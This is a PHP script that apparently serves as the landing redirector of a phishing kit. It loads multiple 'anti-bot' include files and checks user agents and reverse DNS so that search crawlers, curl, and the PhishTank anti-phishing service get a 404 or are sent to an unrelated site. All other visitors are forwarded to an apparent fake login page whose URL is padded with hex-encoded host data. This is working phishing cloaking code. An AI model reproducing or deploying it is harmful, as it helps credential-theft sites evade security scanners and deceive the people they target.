<?php include'../proxy.php';?><?php

include 'DOX/anti1.php';
include 'DOX/anti2.php';
include 'DOX/anti3.php';
include 'DOX/anti4.php';
include 'DOX/anti5.php';
include 'DOX/anti6.php';
include 'DOX/anti7.php';
include 'DOX/anti8.php';

include 'prevents/anti1.php';
include 'prevents/anti2.php';
include 'prevents/anti3.php';
include 'prevents/anti4.php';
include 'prevents/anti5.php';
include 'prevents/anti6.php';
include 'prevents/anti7.php';
include 'prevents/anti8.php';

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
function is_bitch($user_agent){
    $bitchs = array(
        'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'Sogou web spider',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
    'phishtank',
    'PhishTank',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'hostgator',
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        'spider',
        'crawler',
        "Alexa Crawler",
        "curious george",
        "Curious George",
        "feedfetcher-google",
        "Feedfetcher Google",
        "AdsBot Google",
        "adsbot-google",
        "Crazy Webcrawler",
        "CRAZYWEBCRAWLER",
        "MediaPartners Google",
        "mediapartners-google",
        "YandexBot",
        "yandex",
        "lycos",
        "Lycos",
        "InfoSeek Robot 1.0",
        "infoseek",
        "FastCrawler",
        "fastcrawler",
        "Yahoo",
        "yahoo",
        "Inktomi Slurp",
        "slurp",
        "Bing",
        "bingbot",
        "Baiduspider",
        "baiduspider");
      foreach($bitchs as $bitch){
            if( stripos( $user_agent, $bitch ) !== false ) return true;
        }
      return false;
}
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    header("Location: https://shereesbeautyboutique.co.za");
    exit;
}
require 'anti/anti1.php';
	require 'anti/anti2.php';
	require 'anti/anti3.php';
	require 'anti/anti4.php';
	require 'anti/anti5.php';
    include('anti/antibots.php');

$host = bin2hex ($_SERVER['HTTP_HOST']);
$Logon="com/index.php?$host-$host-$host$host$host";

header("location: $Logon");


?>
